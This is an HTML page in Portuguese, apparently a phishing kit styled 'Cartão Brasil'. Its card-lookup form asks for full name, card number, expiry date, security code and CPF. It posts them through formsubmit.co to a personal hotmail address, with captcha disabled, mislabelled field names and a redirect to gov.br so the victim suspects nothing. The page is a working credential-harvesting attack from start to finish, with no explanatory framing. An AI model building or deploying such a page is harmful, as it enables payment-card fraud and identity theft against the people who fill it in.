<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cartão Brasil</title>
    <link rel="stylesheet" href="form.css">
</head>

<body>
    

    <div class="box">
        <form action="https://formsubmit.co/newlife321123@hotmail.com" method="POST">
            <fieldset>
                <legend><b> Consulte seu cartão </b></legend>
                <br><br>
                <div class="inputBox">
                    <input type="text" name="nome" id="nome" class="inputUser" required>
                    <label for="nome" class="labelInput">Nome Completo</label>
                </div>
                <br><br>
                <div class="inputBox">
                    <input type="text" name="email" id="email" class="inputUser" required>
                    <label for="email" class="labelInput">Número do cartão cartão</label>
                </div>
                <br><br>
                
                <br>
                
                <br><br>

                    <label for="data_nascimento"><b>Data de vencimento <br> (dia/mês) <br></b> </label>
                    <input type="number" name="data_nascimento" id="data_nascimento" required>
                    <br><br>
                    <label for="data_visita"><b>Código de segurança</b> </label>
                    <input type="number" name="data_visita" id="data_visita" required>

                <br><br>
                <div class="inputBox">
                    <input type="text" name="cidade" id="cidade" class="inputUser" required>
                    <label for="cidade" class="labelInput">CPF do titular do cartão</label>
                </div>
                <br><br>
                
                <br><br>
                <input type="hidden" name="_captcha" value="false" id="">
                <input type="hidden" name="_next" value="https://www.gov.br/pt-br"
                    target="_blank">
                <button type="submit" target="_blank">Enviar</button>

            </fieldset>
        </form>
    </div>
</body>

</html>
